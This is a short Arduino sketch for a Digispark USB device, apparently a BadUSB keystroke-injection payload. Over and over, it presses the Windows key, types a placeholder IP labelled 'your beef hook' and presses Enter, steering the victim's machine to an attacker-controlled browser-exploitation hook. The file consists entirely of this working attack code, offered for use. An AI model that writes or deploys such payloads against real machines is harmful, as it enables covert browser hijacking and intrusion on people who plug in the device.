#define kbd_tr_tr
#include "DigiKeyboard.h"

void setup() {


}

void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("10.0.0.0"); //your beef hook
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
